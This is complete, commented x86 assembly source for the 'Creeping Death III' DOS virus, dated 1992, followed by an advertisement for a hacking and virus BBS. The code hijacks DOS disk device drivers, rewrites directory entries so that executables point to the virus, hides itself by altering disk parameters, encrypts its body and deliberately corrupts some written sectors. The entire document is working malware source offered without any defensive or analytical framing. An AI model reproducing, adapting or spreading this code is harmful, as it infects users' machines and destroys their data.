;*****************************************************************************;
;                                                                             ;
; Creeping Death III (Encrypting, try to find it)                             ;
;                                                                             ;
; (c) Copyright 1992 by Bit Addict                                            ;
;                                                                             ;
;*****************************************************************************;

code segment public 'code'
		assume	cs:code, ds:code, es:code, ss:code

;*****************************************************************************;
;                                                                             ;
; Data                                                                        ;
;                                                                             ;
;*****************************************************************************;

		org	5ch			; use the space reserved for
						; the fcbs and command line
						; for more inportant data,
						; because we won't need this
						; data when the virus is
						; installed

EncryptWrite2:	db	36 dup(?)		; Encrypt DoRequest Encrypt

BPB_Buf		db	32 dup(?)		; buffer for BPB

Request		equ	this dword		; address of the request header
RequestOffset	dw	?
RequestSegment	dw	?


	        org	100h			; com-file starts at offset 100
						; hex

;*****************************************************************************;
;                                                                             ;
; Actual start of virus. In this part the virus initializes the stack and     ;
; adjusts the device driver used by dos to read and write from floppy's and   ;
; hard disks. Then it will start the orginal exe or com-file                  ;
;                                                                             ;
;*****************************************************************************;

Encrypt:	mov	si,offset Main-1	; this part of the program
		mov	cx,400h-11		; will decode the encoded
Repeat:		xor	byte ptr [si],0		; program, so it can be 
		inc	si			; executed
		loop	Repeat

Main:		mov	sp,600h			; init stack
		inc	word ptr Counter

;*****************************************************************************;
;                                                                             ;
; Get dosversion, if the virus is running with dos 4+ then si will be 0 else  ;
; si will be -1                                                               ;
;                                                                             ;
;*****************************************************************************;

DosVersion:	mov	ah,30h			; fn 30h = Get Dosversion
		int	21h			; int 21h
		cmp	al,4			; major dosversion 
		sbb	di,di
		mov	byte ptr drive[2],-1	; set 2nd operand of cmp ah,??

;*****************************************************************************;
;                                                                             ;
; Adjust the size of the codesegment, with dos function 4ah                   ;
;                                                                             ;
;*****************************************************************************;

		mov	bx,60h			; Adjust size of memory block
		mov	ah,4ah			; to 60 paragraphs = 600h bytes
		int	21h			; int 21h

		mov	ah,52h			; get internal list of lists
		int	21h			; int 21h

;*****************************************************************************;
;                                                                             ;
; If the virus code segment is located behind the dos config memory block the ;
; code segment will be part of the config memory block making it 61h          ;
; paragraphs larger. If the virus is not located next to the config memory    ;
; block the virus will set the owner to 8h (Dos system)                       ;
;                                                                             ;
;*****************************************************************************;

		mov	ax,es:[bx-2]		; segment of first MCB
		mov	dx,cs			; dx = MCB of the code segment
		dec	dx
NextMCB:	mov	ds,ax			; ax = segment next MCB
		add	ax,ds:[3]
		inc	ax
		cmp	ax,dx			; are they equal ?
		jne	NextMCB			; no, not 1st program executed
		cmp	word ptr ds:[1],8
		jne	NoBoot
		add	word ptr ds:[3],61h	; add 61h to size of block
NoBoot:		mov	ds,dx			; ds = segment of MCB
		mov	word ptr ds:[1],8	; owner = dos system

;*****************************************************************************;
;                                                                             ;
; The virus will search for the disk paramenter block for drive a: - c: in    ;
; order to find the device driver for these block devices. If any of these    ;
; blocks is found the virus will install its own device driver and set the    ;
; access flag to -1 to tell dos this device hasn't been accesed yet.          ;
;                                                                             ;
;*****************************************************************************;

		cld				; clear direction flag
		lds	bx,es:[bx]		; get pointer to first drive
						; paramenter block

Search:		cmp	bx,-1			; last block ?
		je	Last
		mov	ax,ds:[bx+di+15h]	; get segment of device header
		cmp	ax,70h			; dos device header ??
		jne	Next			; no, go to next device
		xchg	ax,cx
		mov	byte ptr ds:[bx+di+18h],-1 ; set access flag to "drive 
						; has not been accessed"
		mov	si,offset Header-4	; set address of new device
		xchg	si,ds:[bx+di+13h]	; and save old address
		mov	ds:[bx+di+15h],cs
Next:		lds	bx,ds:[bx+di+19h]	; next drive parameter block
		jmp	Search

;*****************************************************************************;
;                                                                             ;
; If the virus has failed in starting the orginal exe-file it will jump here. ;
;                                                                             ;
;*****************************************************************************;

Boot:		mov	ds,ds:[16h]		; es = parent PSP
		mov	bx,ds:[16h]		; bx = parent PSP of Parent PSP
		xor	si,si
		sub	bx,1			; filename+path available ?
		jnb	Exec			; yes, execute it
		mov	ax,cs			; get segment of MCB
		dec	ax
		mov	ds,ax
		mov	cl,8			; count length of filename
		mov	si,8
		mov	di,0ffh
Count:		lodsb
		or	al,al
		loopne	Count
		not	cl
		and	cl,7
NextByte:	mov	si,8			; search for this name in the
		inc	di			; parent PSP to find the path
		push	di			; to this file
		push	cx
		rep	cmpsb
		pop	cx
		pop	di
		jne	NextByte
BeginName:	dec	di			; name found, search for start
		cmp	byte ptr es:[di-1],0	; of name+path
		jne	BeginName
		mov	si,di
		mov	bx,es
		jmp	short Exec		; execute it

;*****************************************************************************;
;                                                                             ;
; If none of these devices is found it means the virus is already resident    ;
; and the virus wasn't able to start the orginal exe-file (the file is        ;
; corrupted by copying it without the virus memory resident). If the device   ;
; is found the information in the header is copied.                           ;
;                                                                             ;
;*****************************************************************************;

Last:		jcxz	Exit

;*****************************************************************************;
;                                                                             ;
; The information about the dos device driver is copyed to the virus code     ;
; segment                                                                     ;
;                                                                             ;
;*****************************************************************************;

		mov	ds,cx			; ds = segment of Device Driver
		add	si,4
		push	cs
		pop	es
		mov	di,offset Header	; prepare header of the viral
		movsw				; device driver and save the
		lodsw				; address of the dos strategy
		mov	es:StrBlock,ax		; and interrupt procedures
		mov	ax,offset Strategy
		stosw
		lodsw
		mov	es:IntBlock,ax
		mov	ax,offset Interrupt
		stosw
		movsb

;*****************************************************************************;
;                                                                             ;
; Deallocate the environment memory block and start the this file again, but  ;
; if the virus succeeds it will start the orginal exe-file.                   ;
;                                                                             ;
;*****************************************************************************;

		push	cs
		pop	ds
		mov	bx,ds:[2ch]		; environment segment
		or	bx,bx			; environment available ?
		jz	Boot			; no, computer is rebooted
		mov	es,bx
		mov	ah,49h			; deallocate memory
		int	21h
		xor	ax,ax			; end of environment is marked
		mov	di,1			; with two zero bytes
Seek:		dec	di			; scan for end of environment
		scasw
		jne	Seek
		lea	si,ds:[di+2]		; es:si = start of filename
Exec:		push	bx
		push	cs
		pop	ds
		mov	bx,offset Param
		mov	ds:[bx+4],cs		; set segments in EPB
		mov	ds:[bx+8],cs
		mov	ds:[bx+12],cs
		pop	ds
		push	cs
		pop	es

		mov	di,offset Filename	; copy name of this file
		push	di
		mov	cx,40
		rep	movsw
		push	cs
		pop	ds

		mov	ah,3dh			; open file, this file will
		mov	dx,offset File		; not be found but the entire
		int	21h			; directory is searched and
		pop	dx			; infected

		mov	ax,4b00h		; execute file
		int	21h
Exit:		mov	ah,4dh			; get exit-code
		int	21h
		mov	ah,4ch			; terminate (al = exit code)
		int	21h

;*****************************************************************************;
;                                                                             ;
; Installation complete                                                       ;
;                                                                             ;
;*****************************************************************************;
;                                                                             ;
; The next part contains the device driver used by creeping death to infect   ;
; directory's                                                                 ;
;                                                                             ;
; The device driver uses only the strategy routine to handle the requests.    ;
; I don't know if this is because the virus will work better or the writer    ;
; of this virus didn't know how to do it right.                               ;
;                                                                             ;
;*****************************************************************************;


Strategy:	mov	cs:RequestOffset,bx	; store segment and offset of
		mov	cs:RequestSegment,es	; request block
		retf				; return to dos (or whatever
						; called this device driver)

Interrupt:	push	ax			; driver strategy block
		push	bx			; save registers
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es

		les	bx,cs:Request		; es:bx = request block
		push	es			; ds:bx = request block
		pop	ds
		mov	al,ds:[bx+2]		; command code

		cmp	al,4			; read sector from disk
		je	Input
		cmp	al,8			; write sector to disk
		je	Output
		cmp	al,9
		je	Output

		call	DoRequest		; let dos do handle the request

		cmp	al,2			; Build BPB
		jne	Return
		lds	si,ds:[bx+12h]		; copy the BPB and change it
		mov	di,offset bpb_buf	; into one that hides the virus
		mov	es:[bx+12h],di
		mov	es:[bx+14h],cs
		push	es			; copy
		push	cs
		pop	es
		mov	cx,16
		rep	movsw
		pop	es
		push	cs
		pop	ds
		mov	al,ds:[di+2-32]		; change
		cmp	al,2
		adc	al,0
		cbw
		cmp	word ptr ds:[di+8-32],0	; >32mb partition ?
		je	m32			; yes, jump to m32
		sub	ds:[di+8-32],ax		; <32mb partition
		jmp	short Return
m32:		sub	ds:[di+15h-32],ax	; >32mb partition
		sbb	word ptr ds:[di+17h-32],0
Return:		pop	es			; return to caller
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retf

Output:		inc	byte ptr cs:Random	; increase counter
		jnz	Skip			; zero ?
		push	bx			; yes, change one byte in the
		push	ds			; sector to write
		lds	bx,ds:[bx+16h]
		inc	bh
		inc	byte ptr ds:[bx]	; destroy some data
		pop	ds
		pop	bx
Skip:		mov	cx,0ff09h
		call	Check			; check if disk changed
		jz	Disk			; yes, write virus to disk
		jmp	InfectSector		; no, just infect sector
Disk:		call	DoRequest
		jmp	short InfectDisk

ReadError:	add	sp,16			; error during request
		jmp	short Return

Input:		call	check			; check if disk changed
		jnz	InfectDisk		; no, read sector
		jmp	Read
InfectDisk:	mov	byte ptr ds:[bx+2],4	; yes, write virus to disk
		cld				; save last part of request
		lea	si,ds:[bx+0eh]
		mov	cx,8
Save:		lodsw
		push	ax
		loop	Save
		mov	word ptr ds:[bx+14h],1	; read 1st sector on disk
		call	ReadSector
		jnz	ReadError
		mov	byte ptr ds:[bx+2],2	; build BPB
		call	DoRequest
		lds	si,ds:[bx+12h]		; ds:si = BPB
		mov	di,ds:[si+6]		; size of root directory
		add	di,15			; in sectors
		mov	cl,4
		shr	di,cl
		mov	al,ds:[si+5]
		cbw
		mov	dx,ds:[si+0bh]
		mul	dx			; ax=fat sectors, dx=0
		add	ax,ds:[si+3]
		add	di,ax
		push	di			; save it on stack
		mov	ax,ds:[si+8]		; total number of sectors
		cmp	ax,dx			; >32mb
		jnz	More			; no, skip next 2 instructions
		mov	ax,ds:[si+15h]		; get number of sectors
		mov	dx,ds:[si+17h]
More:		xor	cx,cx			; cx=0
		sub	ax,di			; dx:ax=number is data sectors
		sbb	dx,cx
		mov	cl,ds:[si+2]		; cx=sectors / cluster
		div	cx			; number of clusters on disk
		cmp	cl,2			; 1 sector/cluster ?
		sbb	ax,-1			; number of clusters (+1 or +2)
		push	ax			; save it on stack
		call	Convert			; get fat sector and offset in
		mov	byte ptr es:[bx+2],4	; sector
		mov	es:[bx+14h],ax
		call	ReadSector		; read fat sector
		lds	si,es:[bx+0eh]
		add	si,dx
		sub	dh,cl			; has something to do with the
		adc	dx,ax			; encryption of the pointers
		mov	word ptr cs:[gad+1],dx
		cmp	cl,1			; 1 sector / cluster
		jne	Ok
		not	di			; this is used when the
		and	ds:[si],di		; clusters are 1 sector long
		pop	ax			; allocate 1st cluster
		push	ax
		inc	ax
		push	ax
		mov	dx,0fh
		test	di,dx
		jz	Here
		inc	dx
		mul	dx
Here:		or	ds:[si],ax
		pop	ax
		call	Convert
		mov	si,es:[bx+0eh]
		add	si,dx
Ok:		mov	ax,ds:[si]		; allocate last cluster
		and	ax,di
		mov	dx,di
		dec	dx
		and	dx,di
		not	di
		and	ds:[si],di
		or	ds:[si],dx
		cmp	ax,dx			; cluster already allocated by
		pop	ax			; the virus ?
		pop	di
		mov	word ptr cs:[pointer+1],ax
		je	DiskInfected		; yes, don't write it and go on
		mov	dx,ds:[si]
		mov	byte ptr es:[bx+2],8	; write the adjusted sector to
		call	DoRequest		; disk
		jnz	DiskInfected
		mov	byte ptr es:[bx+2],4	; read it again
		call	ReadSector
		cmp	ds:[si],dx		; is it written correctly ?
		jne	DiskInfected		; no, can't infect disk
		dec	ax
		dec	ax			; calculate the sector number
		mul	cx			; to write the virus to
		add	ax,di
		adc	dx,0
		push	es
		pop	ds
		mov	word ptr ds:[bx+12h],2
		mov	ds:[bx+14h],ax		; store it in the request hdr
		test	dx,dx
		jz	Less
		mov	word ptr ds:[bx+14h],-1
		mov	ds:[bx+1ah],ax
		mov	ds:[bx+1ch],dx
Less:		mov	ds:[bx+10h],cs
		mov	ds:[bx+0eh],100h
		mov	byte ptr es:[bx+2],8	; write it
		call	EncryptWrite1

DiskInfected:	mov	byte ptr ds:[bx+2],4	; restore this byte
		std				; restore other part of the
		lea	di,ds:[bx+1ch]		; request
		mov	cx,8
Load:		pop	ax
		stosw
		loop	Load
Read:		call	DoRequest		; do request

		mov	cx,9
InfectSector:	mov	di,es:[bx+12h]		; get number of sectors read
		lds	si,es:[bx+0eh]		; get address of data
		sal	di,cl			; calculate end of buffer
		xor	cl,cl
		add	di,si
		xor	dl,dl
		push	ds			; infect the sector
		push	si
		call	find
		jcxz	no_inf			; write sector ?
		mov	al,8
		xchg	al,es:[bx+2]		; save command byte
		call	DoRequest		; write sector
		mov	es:[bx+2],al		; restore command byte
		and	byte ptr es:[bx+4],07fh
no_inf:		pop	si
		pop	ds
		inc	dx			; disinfect sector in memory
		call	find
		jmp	Return			; return to caller

;*****************************************************************************;
;                                                                             ;
; Subroutines                                                                 ;
;                                                                             ;
;*****************************************************************************;

Find:		mov	ax,ds:[si+8]		; (dis)infect sector in memory
		cmp	ax,"XE"			; check for .exe
		jne	com
		cmp	ds:[si+10],al
		je	found
Com:		cmp	ax,"OC"			; check for .com
		jne	go_on
		cmp	byte ptr ds:[si+10],"M"
		jne	go_on
Found:		test	word ptr ds:[si+1eh],0ffc0h ; file to big
		jnz	go_on			    ; more than 4mb
		test	word ptr ds:[si+1dh],03ff8h ; file to small
		jz	go_on			    ; less than  2048 bytes
		test	byte ptr ds:[si+0bh],1ch    ; directory, system or
		jnz	go_on			    ; volume label
		test	dl,dl			; infect or disinfect ?
		jnz	rest
Pointer:	mov	ax,1234h		; ax = viral cluster
		cmp	ax,ds:[si+1ah]		; file already infected ?
		je	go_on			; yes, go on
		xchg	ax,ds:[si+1ah]		; exchange pointers
Gad:		xor	ax,1234h		; encryption
		mov	ds:[si+14h],ax		; store it on another place
		loop	go_on			; change cx and go on
Rest:		xor	ax,ax			; ax = 0
		xchg	ax,ds:[si+14h]		; get pointer
		xor	ax,word ptr cs:[gad+1]	; Encrypt
		mov	ds:[si+1ah],ax		; store it on the right place
Go_on:		rol	word ptr cs:[gad+1],1	; change encryption
		add	si,32			; next directory entry
		cmp	di,si			; end of buffer ?
		jne	find			; no, do it again
		ret				; return

Check:		mov	ah,ds:[bx+1]			; get number of unit
Drive:		cmp	ah,-1				; same as last call ?
		mov	byte ptr cs:[drive+2],ah	; set 2nd parameter
		jne	Changed
		push	ds:[bx+0eh]			; save word
		mov	byte ptr ds:[bx+2],1		; disk changed ?
		call	DoRequest
		cmp	byte ptr ds:[bx+0eh],1		; 1=Yes
		pop	ds:[bx+0eh]			; restore word
		mov	ds:[bx+2],al			; restore command
Changed:	ret					; return

ReadSector:	mov	word ptr es:[bx+12h],1		; read sector from disk

DoRequest:	db	09ah			; call 70:?, orginal strategy
StrBlock	dw	?,70h
		db	09ah			; call 70:?, orginal interrupt
IntBlock	dw	?,70h
		test	byte ptr es:[bx+4],80h	; error ? yes, zf = 0
		ret				; return

Convert:	cmp	ax,0ff0h		; convert cluster number into
		jae	Fat16			; an sector number and offset
		mov	si,3			; into this sector containing
		xor	word ptr cs:[si+gad-1],si	; the fat-item of this
		mul	si				; cluster
		shr	ax,1
		mov	di,0fffh
		jnc	Continue
		mov	di,0fff0h
		jmp	short Continue
Fat16:		mov	si,2
		mul	si
		mov	di,0ffffh
Continue:	mov	si,512
		div	si
		inc	ax
		ret

EncryptWrite1:	push	ds				; write virus to disk
		push	cs				; (encrypted) save regs
		pop	ds
		push	es
		push	cs
		pop	es
		cld					; copy forward
		mov	cx,12				; length of encryptor
		mov	si,offset Encrypt		; start of encryptor
		mov	di,offset EncryptWrite2		; destenation
		inc	byte ptr ds:[si+8]		; change xor value
		rep	movsb				; copy encryptor
		mov	cl,10				; copy dorequest proc
		mov	si,offset DoRequest
		rep	movsb
		mov	cl,12				; copy encryptor
		mov	si,offset Encrypt
		rep	movsb
		mov	ax,0c31fh			; store "pop ds","ret"
		stosw					; instructions
		pop	es				; restore register
		jmp	EncryptWrite2			; encrypt and write vir

;*****************************************************************************;
;                                                                             ;
; Data                                                                        ;
;                                                                             ;
;*****************************************************************************;

File		db	"C:",255,0		; the virus tries to open this
						; file

Counter		dw	0			; this will count the number of
						; systems that are infected by
						; this virus

Param		dw	0,80h,?,5ch,?,6ch,?	; parameters for the
						; exec-function

Random		db	?			; if this byte becomes zero
						; the virus will change the
						; sector that will be written
						; to disk

Header		db	7 dup(?)		; this is the header for the
						; device driver

Filename	db	?			; Buffer for the filename used
						; by the exec-function


;*****************************************************************************;
;                                                                             ;
; The End                                                                     ;
;                                                                             ;
;*****************************************************************************;

code ends					; end of the viral code

end Encrypt					; start at offset 100h for
						; com-file

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
